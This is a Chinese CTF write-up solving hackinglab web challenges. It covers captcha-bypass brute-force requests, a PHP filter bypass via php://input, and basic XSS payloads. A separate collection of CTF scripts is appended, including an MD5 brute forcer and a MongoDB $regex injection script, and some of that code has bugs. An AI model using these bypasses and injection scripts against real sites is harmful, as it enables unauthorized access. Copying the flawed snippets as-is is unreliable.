0x01 key 又又找不到了

小明这次哭了，key 又找不到了！！！ key 啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！ 
通关地址
点这个链接，跳转到了另一个没有 key 的页面，抓包看看，注意截断 response 包，拿到 key。

<script>window.location="./no_key_is_here_forever.php"; </script>
key is : yougotit_script_now
0x02 快速口算

小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2 秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？ 
通关地址
这道题需要用脚本抓取随机的算式计算出结果然后提交，坑的是有一个验证用户的地方折腾了好一阵子，最后用了requests库的session解决了。

# coding=utf-8
import requests, re, sys
reload(sys)
sys.setdefaultencoding('utf-8')

url = 'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'
req = requests.session()
get = req.get(url)
r = re.findall(r'<br/>[\d|\D](.*?)=<', get.content)[0].strip()
print eval(r)
post = req.post(url, data={'v': eval(r)})
key = re.findall(r'<body>(.*?)</', post.content)[0].strip()
print key
python的eval真是神器啊。

0x03 这个题目是空的

Tips: 这个题目真不是随便设置的。 什么才是空的呢？ 通关地址：没有，请直接提交答案 (小写即可)
这题就出的挺无聊的，为空的值挨个试试，最后答案是null。

0x04 怎么就是不弹出 key 呢？

提交说明：提交前 14 个字符即可过关 
通关地址
查看源码发现一大堆js代码，把alert、document.write、prompt这些函数都变成了return false，所以才说没法弹出 key。

直接用浏览器的console就可以搞定了，稍稍改下以便于提交。

var a=function ()
{
    var b=function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1s(1e(p,a,c,k,e,r){e=1e(c){1d(c<a?\'\':e(1p(c/a)))+((c=c%a)>1q?1f.1j(c+1k):c.1n(1o))};1g(!\'\'.1h(/^/,1f)){1i(c--)r[e(c)]=k[c]||e(c);k=[1e(e){1d r[e]}];e=1e(){1d\'\\\\w+\'};c=1};1i(c--)1g(k[c])p=p.1h(1l 1m(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1d p}(\'Y(R(p,a,c,k,e,r){e=R(c){S(c<a?\\\'\\\':e(18(c/a)))+((c=c%a)>17?T.16(c+15):c.12(13))};U(!\\\'\\\'.V(/^/,T)){W(c--)r[e(c)]=k[c]||e(c);k=[R(e){S r[e]}];e=R(){S\\\'\\\\\\\\w+\\\'};c=1};W(c--)U(k[c])p=p.V(Z 11(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);S p}(\\\'G(B(p,a,c,k,e,r){e=B(c){A c.L(a)};E(!\\\\\\\'\\\\\\\'.C(/^/,F)){D(c--)r[e(c)]=k[c]||e(c);k=[B(e){A r[e]}];e=B(){A\\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\\'};c=1};D(c--)E(k[c])p=p.C(I J(\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\'+e(c)+\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\',\\\\\\\'g\\\\\\\'),k[c]);A p}(\\\\\\\'t(h(p,a,c,k,e,r){e=o;n(!\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\'.m(/^/,o)){l(c--)r[c]=k[c]||c;k=[h(e){f r[e]}];e=h(){f\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\'};c=1};l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\'),k[c]);f p}(\\\\\\\\\\\\\\\'1 3="6";1 4="7";1 5="";8(1 2=0;2<9;2++){5+=3+4}\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\'|u|i|b|c|d|v|x|y|j\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\\'),0,{}))\\\\\\\',H,H,\\\\\\\'|||||||||||||||A||B||M||D|C|E|F||I||J|G|N|O||P|Q|K\\\\\\\'.K(\\\\\\\'|\\\\\\\'),0,{}))\\\',X,X,\\\'||||||||||||||||||||||||||||||||||||S|R|V|W|U|T|Y|13|Z|11|14|12|10|19|1a|1b|1c\\\'.14(\\\'|\\\'),0,{}))\',1t,1u,\'|||||||||||||||||||||||||||||||||||||||||||||||||||||1e|1d|1f|1g|1h|1i|1v|1s|1l||1m|1n|1o|1r|1k|1j|1q|1p|1w|1x|1y|1z\'.1r(\'|\'),0,{}))',62,98,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|fromCharCode|29|new|RegExp|toString|36|parseInt|35|split|eval|62|75|53|var|slakfj|teslkjsdflk|for'.split('|'),0,{});
    var d=eval(b);
    console.log("key is first 14 chars\n"+d.substr(0,14));
}
key is first 14 chars
slakfjteslkjsd
0x05 逗比验证码第一期

逗比的验证码，有没有难道不一样吗？ 
通关地址
验证码使用过后不过期，直接爆破即可。

Payload: 1238
key is LJLJL789sdf#@sd
0x06 逗比验证码第二期

验证便失效的验证码 
通关地址
这次变高级了一点，验证一次过后就会失效，但是可以在失效后把包里的验证码删掉再发包，服务端就不再验证验证码的内容了。

POST /vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php HTTP/1.1
Host: lab1.xseclab.com
Content-Length: 43
Cache-Control: max-age=0
Origin: http://lab1.xseclab.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
DNT: 1
Referer: http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-GB;q=0.6,en;q=0.4
Cookie: PHPSESSID=c289201fc36523dabee2b3a30846c08f
Connection: close

username=admin&pwd=123&vcode=&submit=submit
这样就可以爆破了。

Payload: 1228
key is LJLJL789ss33fasvxcvsdf#@sd
0x07 逗比的验证码第三期（SESSION）

尼玛，验证码怎么可以这样逗比。。验证码做成这样，你家里人知道吗？ 
通关地址

加入了 session 验证，把 cookies 的内容删掉就好。

POST /vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php HTTP/1.1
Host: lab1.xseclab.com
Content-Length: 43
Cache-Control: max-age=0
Origin: http://lab1.xseclab.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
DNT: 1
Referer: http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-GB;q=0.6,en;q=0.4
Cookie: PHPSESSID=
Connection: close

username=admin&pwd=123&vcode=&submit=submit
Payload: 1298
key is LJLJLfuckvcodesdf#@sd
0x08 微笑一下就能过关了

尼玛，碰到这样的题我能笑得出来嘛... 
通关地址
这题还有点难度（代码审计的我都不怎么会。。。），可以看到源码。

<?php  
    header("Content-type: text/html; charset=utf-8");
    if (isset($_GET['view-source'])) {
        show_source(__FILE__);
        exit();
    }

    include('flag.php');

    $smile = 1;  

    if (!isset ($_GET['^_^'])) $smile = 0;  
    if (preg_match ('/\./', $_GET['^_^'])) $smile = 0;  
    if (preg_match ('/%/', $_GET['^_^'])) $smile = 0;  
    if (preg_match ('/[0-9]/', $_GET['^_^'])) $smile = 0;  
    if (preg_match ('/http/', $_GET['^_^']) ) $smile = 0;  
    if (preg_match ('/https/', $_GET['^_^']) ) $smile = 0;  
    if (preg_match ('/ftp/', $_GET['^_^'])) $smile = 0;  
    if (preg_match ('/telnet/', $_GET['^_^'])) $smile = 0;  
    if (preg_match ('/_/', $_SERVER['QUERY_STRING'])) $smile = 0;
    if ($smile) {
        if (@file_exists ($_GET['^_^'])) $smile = 0;  
    }  
    if ($smile) {
        $smile = @file_get_contents ($_GET['^_^']);  
        if ($smile === "(●'◡'●)") die($flag);  
    }  
?>
自己搭个环境挨个echo一下，慢慢调，可以看出主要考察了三个地方，第一个是$_SERVER['QUERY_STRING']，此处^_^不合法；第二个是那一串匹配和@file_get_contents，用伪协议可以绕过；第三处是笑脸的编码，这个地方最坑。。。被网上的各种转码坑惨了。。。

第一处绕过是利用 PHP 的一个特性，.、[]等符号作为key提交时会被转为_，而$_SERVER['QUERY_STRING']直接提取 URL 则不会转。

第三处各种编码都不行，实在搞不定，用 Python 自己搞（用 Linux 下的），果然网上的编码转换都有 bug！正确的 URL 编码应该是%28%E2%97%8F%27%E2%97%A1%27%E2%97%8F%29。

# coding=utf-8
import urllib, sys
reload(sys)
sys.setdefaultencoding('utf-8')
print urllib.quote("(●'◡'●)")
http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^.^=php://input
POST提交如下字符串的URL解码(â'â¡'â)
%28%E2%97%8F%27%E2%97%A1%27%E2%97%8F%29
0x09 逗比的手机验证码

你的手机号码是 13388886666，验证码将会以弹窗的形式给出 
通关地址
顺着他的意思来就行了。

key is LJLJLGod!@@sd
0x0A 基情燃烧的岁月

Tips: 你是一名黑客，你怀疑你的 “（男 / 女）闺蜜” 的出轨了，你要登陆 TA 手机的网上营业厅查看详单，一探究竟！ 闺蜜手机号码: 13388886666 
通关地址
看不到验证码了，爆破，第一轮出来一个手机号，改掉后再爆破，出来 key。

前任的手机号码是:13399999999
key is LKK8*(!@@sd
0x0B 验证码识别

Tips: 验证码依然是 3 位数 
通关地址
这次要图像识别了，上神器，pkav 的 http fuzzer，图像识别那里加上自己的 cookies，注意选单线程，多线程会出现验证码失效的情况。

key is 133dbc85dda4aa**)
0x0C XSS 基础关

XSS 基础: 很容易就可以过关. XSS 类题目必须在平台登录才能进行. 登录地址请参考左侧 <子系统> 
通关地址
用最简单的 payload 就可以，不过不能用 chrome 浏览器，好像会过滤掉，用 firefox 即可。

<script>alert(HackingLab)</script>
key is: myxssteststart!
0x0D XSS 基础 2: 简单绕过

很容易就可以过关. 
通关地址
 <img src=1 onerror=alert(HackingLab)>
key is: xss2test2you
其实也可以 burp 抓返回包，直接用上一题的 payload 弹，一样有 key。

0x0E XSS 基础 3: 检测与构造

Tips: 不是很难 
通关地址
还是用 burp 抓包，不过<script>用不了，用<img>就行了。

xss3test2youOK_striptag
0x0F Principle 很重要的 XSS

原理 / 原则 / 理念很重要..... 不是所有的 xss 都叫特仑苏.. 
Take it easy! 
通关地址
和上一题一样。。。可能是我不太懂出题人的意思？

key is: xss4isnoteasy
#1.暴力破解压缩包。

2.利用像素点还原图片。

 1 from PIL import Image
 2 import re
 3 if __name__ == '__main__':
 4     x = 887 //将像素点个数进行分解，可以确定图片的长宽
 5     y = 111
 6     i = 0
 7     j = 0
 8      
 9     c = Image.new("RGB", (x,y))
10     file_object = open('ce.txt') //ce.txt中保存着像素点的坐标
11      
12     for i in range(0,  x): 
13         for j in range(0,  y):
14             line = file_object.next() //每次读取一个像素点
15             lst = line.split(",") //lst生成一个元组
16             c.putpixel((i, j), (int(lst[0]), int(lst[1]), int(lst[2])))
17      
18     c.show()
19     c.save("c.png")
 
3.py requests方法的利用以及利用正则匹配查找文本暴力破解md5值。

复制代码
 1 #coding : utf8
 2 import requests
 3 import re
 4 import hashlib
 5 import itertools
 6 s = requests.session()  //建立一个session对话
 7 url = "http://106.75.67.214:2050/?pass=bee7a613a8fa4f2f"
 8 data = {'PHPSESSID':'6h7b4caq8bo41i3m5fg2983cq5'}
 9 content = s.get(url=url,data=data)
10 target = re.findall("sh\"\>(.*)\<",content.text) 
11 target = target[0]
12 poc = re.findall("code\"\>(.*)\<",content.text)
13 str1 = poc[0]
14 a = [''.join(x) for x in itertools.permutations(str1, 9)]  //join方法是通过指定的字符串来连接序列元素从而构成新字符串,permutations用来生成无重复字符的元组
15 for i in range(0,len(a)):
16 final = hashlib.md5(a[i])
17 if final.hexdigest() == target:
18 flag = s.get(url="http://106.75.67.214:2050/?code="+a[i])
19 print flag.content
20 print flag.headers
复制代码
 4.利用py将base64编码的字符串还原成图片

复制代码
1 import os,base64   
2 strs='''''sdasdas==''' //已经编码的base64字符串 
3   
4 imgdata=base64.b64decode(strs)  
5 file=open('1.jpg','wb')  
6 file.write(imgdata)  
7 file.close() 
复制代码
 5.生成0e哈希值：

复制代码
 1 #coding:utf-8
 2 import hashlib
 3 import itertools
 4 def go():
 5     payload = [c for c in "qwertyuioplkjhgfdsazxcvbnm123654789"]
 6     i = 0
 7     print payload
 8     for j in itertools.product(payload,repeat=30): #repeat参数指定长度
 9         payloads = "".join(j)
10         #print pow
11         #i = i+ 1
12         #if i == 10:
13         #    break
14         str1 = hashlib.md5(payloads).hexdigest + "SALT"
15         str2 = hashlib.md5(str1)
16         if (str2[0]=="0") & (str2[1]=="e") & (str2[2:].isdigit()):
17             print payloads
18 go()
复制代码
6.mongodb基于正则注入：

复制代码
 1 #coding:utf-8
 2 import requests
 3 import string
 4 # print string.ascii_letters
 5 # print string.digits
 6 flag = "c1ctf{"
 7 payload = string.ascii_letters + string.digits
 8 
 9 url = "http://xx.x.x.x/index.php?"
10 restsrt = True
11 while restsrt:
12     restsrt = False
13     for i in payload:
14         payloads = flag + i
15         post_data = {"username":"admin","passwd[$regex]":flag+".*"}
16         #post_data = {"username":"admin","passwd[$regex]":"^"+flag}
17         r = requests.get(url = url,data = post_data,allow_redirects = False)
18         if r.status_code == "302":
19             print payloads
20             flag = flag + i
21             restsrt =True
22             if i == "}":
23                 exit(0)
24             break
25         
复制代码
7.多次压缩打包

复制代码
 1 #coding:utf-8
 2 import tarfile
 3 for i in range(1,2):
 4     tfile = tarfile.open("shell0.tar.gz","w:gz") #打包压缩
 5     tfile.add("flag.py")
 6     tfile.close()
 7 
 8 for i in range(1,300):
 9     tfile = tarfile.open("shell"+str(i)+".tar.gz","w:gz")
10     tfile.add("1.php")
11     tfile.add("shell"+str(i-1)+".tar.gz")
12     tfile.close()
复制代码
8.多次解压：

1 #coding:utf-8
2 import tarfile
3 for i in range(1,300)[::-1]:
4     file = tarfile.open("shell"+str(i)+"tar.gz")
5     file.extractall()
6     file.close()